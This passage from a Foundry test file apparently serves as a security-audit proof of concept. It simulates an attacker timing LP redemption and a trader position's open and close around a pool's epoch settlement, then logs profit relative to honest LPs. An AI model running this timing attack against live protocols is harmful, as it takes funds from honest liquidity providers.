    function test_16_Day_EightCycles() public {
        uint256 snap = vm.snapshotState();
        (int256 baseAttacker, int256 baseHonest) = _day(false);
        vm.revertToState(snap);
        (int256 attacker, int256 honest) = _day(true);
        console2.log("8 cycles: attacker net vs baseline", _usd(attacker - baseAttacker));
        console2.log("8 cycles: honest   net vs baseline", _usd(honest - baseHonest));
    }

    // ---------------------------------------------------------------------
    // 11. Tighter execution: no price exposure after the exit.
    // ---------------------------------------------------------------------

    /// @dev The close is committed before the boundary, so settlement and close fill from one price update in one block.
    function test_17_TightTiming_SettleAndCloseSameBlock() public {
        Run memory r = _std(CONF_REAL);
        uint256 snap = vm.snapshotState();
        r.trade = false;
        Out memory base = _run(r);
        vm.revertToState(snap);

        _seed(r);
        (uint256 requestId,) = _redeemAll(A_LP, false);
        uint256 boundary = pool.lpEpochStart(requestId);

        vm.warp(boundary - 30);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        vm.warp(boundary - 16);
        _open(A_TRADER, r.size, TRADER_MARGIN, r.conf);

        // Parse-unique semantics: the fill must be the first update after commit, so commit one second before it.
        vm.warp(boundary - 1);
        vm.prank(A_TRADER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, r.size, 0, 2e8, true);

        vm.warp(boundary);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 publishTime = boundary;
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(1e8), r.conf, int32(-8), publishTime, publishTime - 1);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(uint256(1e8));
        vm.warp(boundary + 1);
        vm.roll(vm.getBlockNumber() + 1);

        uint256 blockAtSettle = vm.getBlockNumber();
        router.settleLpEpoch(data);
        _claimAll(A_LP, requestId, false);
        vm.prank(A_TRADER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(closeId, data);
        console2.log("close status / terminal / pending", uint256(result.status), uint256(result.terminalReason), uint256(result.pendingReason));
        assertEq(vm.getBlockNumber(), blockAtSettle, "settle and close in one block");
        (uint256 positionSize,,,,,,) = engine.positions(A_TRADER);
        assertEq(positionSize, 0, "close filled in the settlement block");

        _withdrawTrader(A_TRADER);
        (uint256 seniorRequest,) = _redeemAll(SENIOR_LP, true);
        (uint256 honestRequest,) = _redeemAll(HONEST, false);
        vm.warp(pool.lpEpochStart(seniorRequest) + 1);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        router.settleLpEpoch(_pyth(1e8, r.conf));
        _claimAll(SENIOR_LP, seniorRequest, true);
        _claimAll(HONEST, honestRequest, false);
        int256 attacker = int256(settlementToken.balanceOf(A_LP)) + int256(settlementToken.balanceOf(A_TRADER))
            - int256(r.attackerJ) - int256(TRADER_FUNDING);
        int256 honest = int256(settlementToken.balanceOf(HONEST)) - int256(r.honestJ);
        console2.log("tight timing: attacker net vs baseline", _usd(attacker - base.attacker));
        console2.log("tight timing: honest   net vs baseline", _usd(honest - base.honest));
    }

    // ---------------------------------------------------------------------
    // 12. Failure mode of the pre-committed close: a keeper fills it before settlement.
    // ---------------------------------------------------------------------

    /// @dev Anyone may execute a committed order. If the close lands before settlement, the rebate precedes the exit
    ///      and the attacker holds the losing control path. Quantifies why the close should be committed after settle.
    function test_18_PreCommittedClose_KeeperFillsBeforeSettlement() public {
        Run memory r = _std(CONF_REAL);
        uint256 snap = vm.snapshotState();
        r.trade = false;
        Out memory base = _run(r);
        vm.revertToState(snap);

        _seed(r);
        (uint256 requestId,) = _redeemAll(A_LP, false);
        uint256 boundary = pool.lpEpochStart(requestId);
        vm.warp(boundary - 30);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        vm.warp(boundary - 16);
        _open(A_TRADER, r.size, TRADER_MARGIN, r.conf);
        vm.warp(boundary - 1);
        vm.prank(A_TRADER);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, r.size, 0, 2e8, true);

        vm.warp(boundary);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(1e8), r.conf, int32(-8), boundary, boundary - 1);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(uint256(1e8));
        vm.warp(boundary + 1);
        vm.roll(vm.getBlockNumber() + 1);

        vm.prank(address(0xCAFE)); // unrelated keeper, ahead of the attacker's settlement transaction
        router.executeOrder(closeId, data);
        (uint256 positionSize,,,,,,) = engine.positions(A_TRADER);
        assertEq(positionSize, 0, "keeper filled the close first");

        // Flat book: settlement is permissionless from the cached mark. The exit now prices without the VPI.
        pool.settleLpEpoch(0, 0);
        _claimAll(A_LP, requestId, false);
        _withdrawTrader(A_TRADER);
        (uint256 seniorRequest,) = _redeemAll(SENIOR_LP, true);
        (uint256 honestRequest,) = _redeemAll(HONEST, false);
        vm.warp(pool.lpEpochStart(seniorRequest) + 1);
        router.updateMarkPrice(_pyth(1e8, r.conf));
        router.settleLpEpoch(_pyth(1e8, r.conf));
        _claimAll(SENIOR_LP, seniorRequest, true);
        _claimAll(HONEST, honestRequest, false);
        int256 attacker = int256(settlementToken.balanceOf(A_LP)) + int256(settlementToken.balanceOf(A_TRADER))
            - int256(r.attackerJ) - int256(TRADER_FUNDING);
        console2.log("keeper-first close: attacker net vs baseline", _usd(attacker - base.attacker));
    }

}
```

